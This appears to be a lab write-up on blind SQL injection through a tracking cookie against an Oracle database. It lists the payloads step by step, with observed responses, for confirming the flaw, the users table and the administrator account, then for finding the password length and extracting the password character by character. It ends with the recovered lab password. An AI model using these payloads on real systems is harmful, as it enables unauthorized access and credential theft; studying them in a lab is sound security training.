Vulnerable parameter - Tracking cookie

Goals:
1- Display the password of the administrator.
2- Log in as the administrator user.

Analysis:
--------

Step #1: Confirm that the parameter is vulnerable to blind SQL injection
' -> error
'' -> 200 response
' || (SELECT '') || ' -> error -> the database is not MySQL nor Microsoft
' || (SELECT '' FROM DUAL) || ' -> 200 response -> Oracle database

' || (SELECT '' FROM DUALasdlkfja;slkdjf) || ' -> error

The query is vulnerable to blind SQL injection

Step #2: Confirm that the users table exist
' || (SELECT '' FROM users) || ' -> error

' || (SELECT '' FROM users WHERE rownum = 1) 
-> 200 response -> users table exist

Step #3: Confirm that username administrator exists in users table
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
-> 200 response 
note: TO_CHAR change the number data type to string 
note: This query (CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END) is like (if 1=1: print(1\0) else: print(''))

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || '
-> error -> the username administrator exist

-> error -> the username exist
-> 200 response -> the username doesn't exist

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'randomusername') || '
-> 200 response -> the username doesn't exist


Step #4: Determine the length of the administrator password
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 1) || '
-> error -> the password is greater than 1

note: You could use the Intruder from Burp Suite to do this or script it

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 10) || '
-> error -> the password is greater than 10

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 15) || '
-> error -> the password is greater than 15

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > 20) || '
-> 200 response -> the length of the password is less than or equal to 20

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) = 20) || '
-> error -> the length of the password is 20

Step #5: Display the administrator password
first character = 'a' 
-> error -> the first character is 'a'
-> 200 response -> the first character is not 'a'

' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, 1, 1) = 'a') || '

-> error -> the first character is 'a'
-> 200 response -> the first character is not 'a'

Do this until you find all the characters in the password

note: You could use the Intruder from Burp Suite to do this or script it

Step #6: Log in as the administrator user

Username: administrator
Password: 5f178k5o6qgb02okcfzn
